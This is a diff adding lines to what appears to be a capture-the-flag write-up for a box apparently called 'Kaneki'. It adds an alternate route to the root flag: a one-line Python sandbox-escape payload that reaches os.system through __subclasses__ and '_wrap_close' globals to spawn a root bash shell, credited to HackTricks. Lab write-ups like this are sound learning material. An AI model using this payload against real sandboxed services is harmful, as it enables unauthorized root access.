@@ -321,3 +321,10 @@ No Kaneki you are so dead
 
 
 GOT THE ROOT FLAG
+
+ANOTHER WAY FOR GETTING THE ROOT FLAG (SPAWNING A ROOT SHELL THIS TIME):
+i got this trick from hackertricks.xyz.com
+link:https://book.hacktricks.xyz/misc/basic-python/bypass-python-sandboxes
+
+
+[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__ == '_wrap_close' ][0]['sys'+'tem']('/bin/bash')
